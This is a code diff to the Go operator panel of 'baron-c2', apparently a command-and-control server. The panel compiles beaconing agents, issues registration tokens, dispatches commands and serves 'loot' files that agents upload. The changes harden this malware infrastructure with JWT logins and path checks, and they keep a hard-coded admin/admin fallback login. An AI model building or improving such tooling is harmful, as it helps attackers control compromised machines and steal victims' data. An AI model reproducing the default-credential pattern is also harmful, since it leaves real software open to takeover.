@@ -10,6 +10,7 @@ import (
 	"strings"
 	"time"
 
+	"baron-c2/internal/auth"
 	"baron-c2/internal/repo"
 	"baron-c2/internal/service"
 	"github.com/gin-gonic/gin"
@@ -17,11 +18,10 @@ import (
 	"golang.org/x/crypto/bcrypt"
 )
 
-// PanelCheck validates an existing token (used by auto-login on page reload)
+// PanelCheck validates JWT (AuthRequired runs before this handler).
 func PanelCheck(c *gin.Context) {
-	// Token was already validated by AuthRequired middleware above.
-	// If we reach here, the token is valid.
-	c.JSON(http.StatusOK, gin.H{"ok": true})
+	u, _ := c.Get("panel_user")
+	c.JSON(http.StatusOK, gin.H{"ok": true, "user": u})
 }
 
 // PanelLogin handles operator authentication
@@ -40,10 +40,14 @@ func PanelLogin(c *gin.Context) {
 	if err := repo.DB.Where("username = ?", input.Login).First(&user).Error; err != nil {
 		// Fallback for first run
 		if input.Login == "admin" && input.Password == "admin" {
-			// In production, we would create this user
+			tok, err := auth.SignPanelToken("admin", true)
+			if err != nil {
+				c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": "token error"})
+				return
+			}
 			c.JSON(http.StatusOK, gin.H{
 				"ok":    true,
-				"token": "master-token", // Simplified for now
+				"token": tok,
 				"user":  "admin",
 				"admin": true,
 			})
@@ -58,9 +62,14 @@ func PanelLogin(c *gin.Context) {
 		return
 	}
 
+	tok, err := auth.SignPanelToken(user.Username, user.IsAdmin)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": "token error"})
+		return
+	}
 	c.JSON(http.StatusOK, gin.H{
 		"ok":    true,
-		"token": "valid-token",
+		"token": tok,
 		"user":  user.Username,
 		"admin": user.IsAdmin,
 	})
@@ -117,8 +126,22 @@ func PanelBuild(c *gin.Context) {
 	input.ServerURL = strings.TrimSpace(input.ServerURL)
 	input.ServerURL = strings.TrimRight(input.ServerURL, "/")
 
-	// Force debug mode for now to troubleshoot
-	input.Debug = true
+	// Beacon: UI often sends milliseconds (e.g. 5000); treat >120 as ms → seconds
+	if input.BeaconInterval > 120 {
+		input.BeaconInterval /= 1000
+	}
+	if input.BeaconInterval < 1 {
+		input.BeaconInterval = 5
+	}
+	if input.BeaconInterval > 3600 {
+		input.BeaconInterval = 3600
+	}
+
+	if os.Getenv("GO_ENV") == "production" {
+		input.Debug = false
+	} else {
+		input.Debug = true
+	}
 
 	// Sanitize name: keep only alphanumeric
 	reg, _ := regexp.Compile("[^a-zA-Z0-9]+")
@@ -137,8 +160,20 @@ func PanelBuild(c *gin.Context) {
 		input.ID = time.Now().Format("020106") + "-" + hexPart
 	}
 
+	buildToken := repo.BuildToken{
+		Token:     repo.GenerateID(),
+		ExpiresAt: time.Now().Add(24 * time.Hour),
+		CreatedAt: time.Now(),
+	}
+	if err := repo.DB.Create(&buildToken).Error; err != nil {
+		log.Error().Err(err).Msg("build token create failed")
+		c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": "db error"})
+		return
+	}
+	input.BuildTokenPlain = buildToken.Token
+
 	GlobalHub.BroadcastSystem("BUILD: Starting compilation for " + input.Name + " (Target: " + input.ID + ")")
-	
+
 	builder := &service.BuilderService{}
 	builder.PrepareParams(&input)
 
@@ -182,24 +217,16 @@ func PanelBuild(c *gin.Context) {
 		log.Error().Str("name", input.Name).Str("err", errorMessage).Msg("compilation failed")
 	}
 
-	// Generate one-time build token for agent registration
-	buildToken := repo.BuildToken{
-		Token:     repo.GenerateID(),
-		ExpiresAt: time.Now().Add(24 * time.Hour),
-		CreatedAt: time.Now(),
-	}
-	repo.DB.Create(&buildToken)
-
 	c.JSON(http.StatusOK, gin.H{
-		"ok":           compileErr == nil,
-		"name":         input.Name,
-		"download_url": downloadURL,
-		"compile_err":  errorMessage,
-		"build_token":  buildToken.Token,
+		"ok":             compileErr == nil,
+		"name":           input.Name,
+		"download_url":   downloadURL,
+		"compile_err":    errorMessage,
+		"build_token":    buildToken.Token,
 	})
 }
 
-// PanelDownloadBuild serves the compiled agent
+// PanelDownloadBuild serves the compiled agent (JWT via AuthRequired or ?token=).
 func PanelDownloadBuild(c *gin.Context) {
 	fileName := c.Query("file")
 	if fileName == "" {
@@ -207,13 +234,23 @@ func PanelDownloadBuild(c *gin.Context) {
 		return
 	}
 
-	path := filepath.Join("builds", filepath.Base(fileName))
-	if _, err := os.Stat(path); os.IsNotExist(err) {
+	base := filepath.Base(fileName)
+	path := filepath.Join("builds", base)
+	clean := filepath.Clean(path)
+	absRoot, errR := filepath.Abs("builds")
+	absFile, errF := filepath.Abs(clean)
+	sep := string(os.PathSeparator)
+	if errR != nil || errF != nil || !(absFile == absRoot || strings.HasPrefix(absFile, absRoot+sep)) {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid path"})
+		return
+	}
+
+	if st, err := os.Stat(clean); err != nil || st.IsDir() {
 		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
 		return
 	}
 
-	c.FileAttachment(path, filepath.Base(fileName))
+	c.FileAttachment(clean, base)
 }
 
 // PanelAdmin handles administrative actions
@@ -283,21 +320,44 @@ func PanelCommand(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"ok": true, "task_id": task.ID})
 }
 
-// PanelDownloadLoot serves files uploaded by agents
+// PanelDownloadLoot serves files uploaded by agents (loot/<cid>/<file>).
 func PanelDownloadLoot(c *gin.Context) {
 	fileName := c.Query("file")
 	if fileName == "" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "File name required"})
 		return
 	}
+	cid := filepath.Base(c.Query("cid"))
 
-	path := filepath.Join("loot", filepath.Base(fileName))
-	if _, err := os.Stat(path); os.IsNotExist(err) {
+	base := filepath.Base(fileName)
+	if base == "" || base == "." || base == ".." {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid file name"})
+		return
+	}
+
+	var path string
+	if cid != "" && cid != "." {
+		path = filepath.Join("loot", cid, base)
+	} else {
+		// Legacy flat layout
+		path = filepath.Join("loot", base)
+	}
+
+	clean := filepath.Clean(path)
+	absLoot, errLoot := filepath.Abs("loot")
+	absFile, errFile := filepath.Abs(clean)
+	sep := string(os.PathSeparator)
+	if errLoot != nil || errFile != nil || !(absFile == absLoot || strings.HasPrefix(absFile, absLoot+sep)) {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid path"})
+		return
+	}
+
+	if st, err := os.Stat(clean); err != nil || st.IsDir() {
 		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
 		return
 	}
 
-	c.FileAttachment(path, filepath.Base(fileName))
+	c.FileAttachment(clean, base)
 }
 
 // filterCompilerErrors extracts only the relevant CS error lines from mcs output.
